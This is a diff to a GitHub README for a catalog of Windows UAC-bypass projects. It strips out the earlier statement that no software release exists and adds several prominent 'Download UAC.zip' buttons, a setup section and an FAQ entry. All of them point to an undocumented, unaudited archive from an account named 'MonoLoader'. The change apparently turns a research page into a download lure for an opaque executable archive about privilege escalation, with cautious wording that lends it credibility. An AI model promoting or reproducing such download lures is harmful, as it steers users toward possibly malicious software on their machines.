@@ -6,24 +6,62 @@
 
 A reference collection for exploring Windows User Account Control research and related administration projects.
 
-[![Explore Sources](https://img.shields.io/badge/Explore%20Sources-d90429?style=for-the-badge&logo=github&logoColor=white)](https://github.com/search?q=uac+bypass&type=repositories&s=updated&o=desc&utm_source=github&utm_acc=HydraSoft&utm_name=Windows-UAC-Research-Catalog "Browse the original GitHub search")
+[![Download ZIP](https://img.shields.io/badge/Download%20UAC.zip-d90429?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/download/UAC/UAC.zip?utm_source=github&utm_acc=MonoLoader&utm_name=Windows-UAC-Research-Catalog "Download the UAC release archive")
+[![Release Notes](https://img.shields.io/badge/View%20Release-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/tag/UAC "Open the release page")
+
+[![Explore Sources](https://img.shields.io/badge/Explore%20Sources-d90429?style=for-the-badge&logo=github&logoColor=white)](https://github.com/search?q=uac+bypass&type=repositories&s=updated&o=desc&utm_source=github&utm_acc=MonoLoader&utm_name=Windows-UAC-Research-Catalog "Browse the original GitHub search")
 [![Browse Catalog](https://img.shields.io/badge/Browse%20Catalog-181717?style=for-the-badge&logo=github&logoColor=white)](#repository-catalog)
 [![Review Checklist](https://img.shields.io/badge/Review%20Checklist-d90429?style=for-the-badge&logo=readthedocs&logoColor=white)](#review-checklist)
 
 </div>
 
-> **Research reference, not a software release.** This collection does not provide an installer, verify third-party binaries, or guarantee the capabilities described by repository authors.
+> **Scope:** This repository contains a research catalog. The separately published release archive is linked below; its contents and runtime behavior have not been inspected for this documentation. A download link is not a safety or compatibility endorsement.
 
 ---
 
 ## Navigation
 
+- [Download and Setup](#download-and-setup)
 - [Overview](#overview)
 - [Repository Catalog](#repository-catalog)
 - [What This Collection Provides](#what-this-collection-provides)
 - [Review Checklist](#review-checklist)
 - [Frequently Asked Questions](#frequently-asked-questions)
 - [Responsible Use](#responsible-use)
+
+## Download and Setup
+
+### Release UAC
+
+| Item | Value |
+| --- | --- |
+| Publisher account | MonoLoader |
+| Release tag | `UAC` |
+| Asset | `UAC.zip` |
+| Asset size | 1,620,036 bytes |
+| Release page | [View on GitHub](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/tag/UAC) |
+
+[![Download ZIP](https://img.shields.io/badge/Download%20UAC.zip-d90429?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/download/UAC/UAC.zip?utm_source=github&utm_acc=MonoLoader&utm_name=Windows-UAC-Research-Catalog "Download the release archive")
+
+1. Open the release page and confirm that the repository and asset match what you intended to download.
+2. Download `UAC.zip` using the button above.
+3. Verify the archive checksum against the value below. The value was reported by GitHub for the asset when checked; it was not independently computed from a downloaded copy.
+4. Extract the archive into a separate folder and inspect its contents before opening any executable.
+5. Follow installation instructions supplied by the publisher only after confirming what the software does and its requirements.
+
+**GitHub-reported SHA-256:**
+
+```text
+aae4f3574c901b994ddbe36ef92e9bcc75357117bc0457cca3ccf42af0814cfe
+```
+
+Matching this checksum helps confirm file integrity, not that the file is safe. If the release asset is replaced, obtain its current checksum from GitHub before relying on this value.
+
+**Installation status:** The release currently has no description documenting its executable, supported operating systems, dependencies, or launch procedure. No installation command or administrator requirement is asserted here. Do not disable antivirus or other security controls to follow this guide.
+
+### Using the documentation catalog
+
+The README and reference files can be read directly on GitHub. They do not require installing or executing `UAC.zip`. The catalog is not a combined implementation of the ten linked tools.
 
 ## Overview
 
@@ -187,9 +225,9 @@ No. **GitHub Topics** are descriptive labels. They are separate from Git tags an
 
 No Topics were shown on those repository pages when checked. This catalog does not invent labels for those entries.
 
-### Where is the download button?
+### What does the download button provide?
 
-This catalog has no software release to download. Its buttons provide navigation and access to sources; they do not imply the existence of a shared installer.
+It links directly to `UAC.zip` in the `UAC` release published under MonoLoader/Windows-UAC-Research-Catalog. The asset has not been downloaded, audited, or tested for this documentation. It is separate from the ten source projects listed in the catalog.
 
 ### Will the search results stay the same?
 
